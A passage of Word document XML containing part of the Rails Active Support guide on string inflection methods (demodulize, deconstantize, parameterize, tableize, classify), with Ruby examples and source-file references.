            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7D6B9228" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># active_model/serializers/xml.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="22D30A02" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>reformat_name(name)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1533C3C6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  name = name.camelize if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>camelize?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7DEA3C9F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  dasherize? ? name.dasherize : name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1E249AB9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0FBA6C56" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/string/inflections.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DDACF1E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5.9.7 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>demodulize</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E48B4B9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Given a string with a qualified constant name, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>demodulize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns the very constant name, that is, the rightmost part of it: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82C3E51" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5649FCBD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"Product".demodulize                        # =&gt; "Product"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F71CF33" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"Backoffice::UsersController".demodulize    # =&gt; "UsersController"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C26D0FC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"Admin::Hotel::ReservationUtils".demodulize # =&gt; "ReservationUtils"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="545FA37C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Active Record for example uses this method to compute the name of a counter cache column:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8280"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="187FFDD1" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="740FA1D6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># active_record/reflection.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16C08E20" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>counter_cache_column</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74190D01" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>options[:counter_cache] == true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0014E617" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    "#{active_record.name.demodulize.underscore.pluralize}_count"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3CCBA43F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  elsif</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>options[:counter_cache]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B68DEF3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    options[:counter_cache]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="313E047E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="333F2520" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0138EF74" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/string/inflections.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0046F549" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5.9.8 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>deconstantize</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D3C9137" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Given a string with a qualified constant reference expression, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>deconstantize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> removes the rightmost segment, generally leaving the name of the constant’s container:</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482389F3" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="579BC9F3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"Product".deconstantize                        # =&gt; ""</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E9F50FD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"Backoffice::UsersController".deconstantize    # =&gt; "Backoffice"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10F2A7FF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"Admin::Hotel::ReservationUtils".deconstantize # =&gt; "Admin::Hotel"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="166FFE7B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Active Support for example uses this method in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Module#qualified_const_set</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7608"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2D1B2CE4" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="618267EF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>qualified_const_set(path, value)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="62DA1EF4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  QualifiedConstUtils.raise_if_absolute(path)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64E25C64" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5AFF5BCB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  const_name = path.demodulize</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11715111" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  mod_name = path.deconstantize</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="433FB63E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  mod = mod_name.empty? ? self</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>: qualified_const_get(mod_name)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E3F43C8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  mod.const_set(const_name, value)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5C185900" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="06960325" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/string/inflections.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44034D86" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5.9.9 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>parameterize</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DC1F887" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>parameterize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> normalizes its receiver in a way that can be used in pretty URLs.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5160"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="5320C73A" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="25682DA2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"John Smith".parameterize # =&gt; "john-smith"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28AB6A7B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"Kurt Gödel".parameterize # =&gt; "kurt-godel"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2B87CE0B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In fact, the result string is wrapped in an instance of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveSupport::Multibyte::Chars</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13F84AE6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/string/inflections.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="375E174C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5.9.10 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>tableize</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FB08BDD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>tableize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>underscore</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> followed by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>pluralize</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5160"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="5329B398" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="22F25B2E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"Person".tableize      # =&gt; "people"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46A0A889" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"Invoice".tableize     # =&gt; "invoices"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C6E6BC9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"InvoiceLine".tableize # =&gt; "invoice_lines"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="01DBA331" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">As a rule of thumb, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>tableize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns the table name that corresponds to a given model for simple cases. The actual implementation in Active Record is not straight </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>tableize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> indeed, because it also demodulizes the class name and checks a few options that may affect the returned string.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62104187" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/string/inflections.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24AEB0C3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5.9.11 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>classify</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CBFF5B7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>classify</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is the inverse of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>tableize</w:t>
      </w:r>
      <w:r>
        <w:t>. It gives you the class name corresponding to a table name:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5400"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="1C38F5EB" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4B425541" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"people".classify        # =&gt; "Person"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4ACD8E68" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"invoices".classify      # =&gt; "Invoice"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4ADD05EB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"invoice_lines".classify # =&gt; "InvoiceLine"</w:t>
